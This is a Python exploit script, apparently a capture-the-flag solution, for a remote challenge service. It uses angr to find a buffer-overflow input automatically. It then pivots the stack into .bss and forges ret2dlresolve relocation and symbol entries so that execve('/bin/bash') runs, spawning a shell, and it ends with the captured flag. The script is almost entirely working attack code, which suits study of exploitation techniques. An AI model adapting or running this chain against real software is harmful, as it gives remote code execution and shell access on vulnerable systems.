#!/usr/bin/env python3
from pwn import *
import angr
import ropper
import time


fname = 'vuln'
ip = 'ctf.battelle.org'
port = 30042

#context.log_level='debug'

LOCAL = False

if LOCAL:
    r = process(fname,aslr=True)

    gdbscript="""
    b *0x08048380
    b *read
    """


    #set follow-fork-mode

    attach('vuln',gdbscript=gdbscript)
else:
    r = remote(ip, port)

s = lambda x : r.send(x)
rl = lambda : r.recvline()
rlb = lambda : r.recvlineb()
sl = lambda x : r.sendline(x)
ru = lambda x :r.recvuntil(x)
rcb = lambda x :r.recvb(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

def leak_binary():
    ru('********************************\n')
    leak = ru('\n********************************\n')
    leak = leak[:-34]

    with open('vuln', "wb+") as the_file:
        the_file.write(leak)
        the_file.close()


def pwn():


    #let angr do the hard work and find the input we need to reach the overflow  

    proj = angr.Project(f'{fname}',auto_load_libs = False)
    sm = proj.factory.simulation_manager(save_unconstrained=True)
    while len(sm.unconstrained)==0:
        sm.step()
    unconstrained_state = sm.unconstrained[0]

    crashing_input = unconstrained_state.posix.dumps(0)
    
    #print(repr(crashing_input))

    #find how many bytes we can read in
    read_block_addr = unconstrained_state.history.bbl_addrs.hardcopy[-10]
    read_block = proj.factory.block(read_block_addr)
    #print(read_block.pp())
    len_user_in = hex(unpack(read_block.bytes[7:11],'all'))
    len_user_in =  int(len_user_in,16)
    print(f'user can input {len_user_in} bytes')


    #find how big the buffer is
    memset_block_addr = unconstrained_state.history.bbl_addrs.hardcopy[-13]
    memset_block = proj.factory.block(memset_block_addr)
    #print(memset_block.pp())
    buffer_size = hex(unpack(memset_block.bytes[19:20],'all'))
    buffer_size =  int(buffer_size,16)
    print(f'buffer size is {buffer_size} bytes')

    overflow = len_user_in - buffer_size

    print(f'we have a {overflow} bytes overflow')


    ################
    # exploit part #
    ################

    elf = context.binary = ELF(f'./{fname}')
    rop = ROP(elf)
    bss_addr = elf.bss()

    #get sections
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
    gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr


    #we need to find a fake_frame_addr that have a specific r_info that in 
    # <_dl_fixup+108>  movzx  edx, WORD PTR [edx+esi*2]
    #[edx+esi*2] point to a addr that contains a word (2bytes) of 0x0000
    #edx = 0x080482dc esi=r_info (our r_info = will be 30e)

    #found out with dynamic testing/debugging that i have to adjust the fake_frame_addr by adding 0x220
    addr_adj = 0x220
    fake_frame_addr = int(bss_addr + addr_adj)
    print(f'fake_frame_addr = {hex(fake_frame_addr)}')

    ################
    # stack pivote #
    ################
    rop.raw(crashing_input[:-overflow])
    rop.raw(b'a'*12)                        #pad
    rop.raw(b'b'*4)                         #ebp
    rop.read(0,fake_frame_addr,100)
    rop.migrate(fake_frame_addr)
    sl(rop.chain())
    
    ###############################################################
    # calculate the offset from rel.plt to our fake_rel_plt entry #
    ###############################################################
    fake_dlresolve_index = fake_frame_addr + 24 - rel_plt

    ##########################################################
    # calculate and align the addr for our fake_dynsym entry #
    ##########################################################
    
    fake_dynsym_addr = fake_frame_addr + 32
    print(f'dynsym_addr = {hex(dynsym)}')
    print(f'fake_dynsym_addr = {hex(fake_dynsym_addr)} this addr need to be 0x10 byte aligned to the dynsym')

    #here we get the last nibl of the fake_dynsym_addr and calculate the alignment
    align = 0x10 - ((fake_dynsym_addr - dynsym) & 0xf)
    print(f'align = {hex(align)}')

    #calculate final fake_dynsym_addr
    fake_dynsym_addr = fake_dynsym_addr + align
    print(f'our final fake_dynsym_addr = {hex(fake_dynsym_addr)}')

    ##################################################################################################
    # calculate the offset from dynstr to our fake string = st_name and create the fake_dynsym struct#
    ##################################################################################################
    
    fake_st_name = fake_dynsym_addr + 0x10 - dynstr
    fake_dynsym = flat([fake_st_name, 0, 0, 0x12])

    ##########################################################################################
    # calculate the offset from dynsym to our fake_dynsym = r_info and create the fake_rel_plt struct #
    ##########################################################################################

    fake_r_info = int((fake_dynsym_addr - dynsym) / 0x10)
    fake_r_offset = elf.got['strncmp']
    fake_r_info = (fake_r_info << 8) | 0x7
    fake_rel_plt = flat([fake_r_offset,fake_r_info])
    
    sleep(1)

    rop = ROP(elf)
    sh = b'/bin/bash\x00'

    rop.raw(plt0)                               #0-4
    rop.raw(fake_dlresolve_index)               #4-8
    rop.raw(elf.plt['strncmp'])                 #8-12
    rop.raw(fake_frame_addr + 80)               #12-16
    rop.raw(0x00)                               #16-20
    rop.raw(0x00)                               #20-24
    rop.raw(fake_rel_plt)                       #24-32  rel.plt + (fake_dlresolve_index * 0x10)
    rop.raw('a'*align)                          #32-36 
    rop.raw(fake_dynsym)                        #36-52
    rop.raw(b'execve\x00')                      #52-59
    rop.raw('a'*(80 - len(rop.chain())))
    rop.raw(sh)

    sl(rop.chain())

    sl(b'echo "DONE" > log')
    sleep(2.5)

    leak = ru('YOU FOUND THE HOLY GRAIL!')
    print(leak)

if __name__ == '__main__':
    for i in range(5):
        leak_binary()
        pwn()
        print(i)

    inter()



#flag{Y0u_f1g4t_w311_sir_knig4t_7461834}
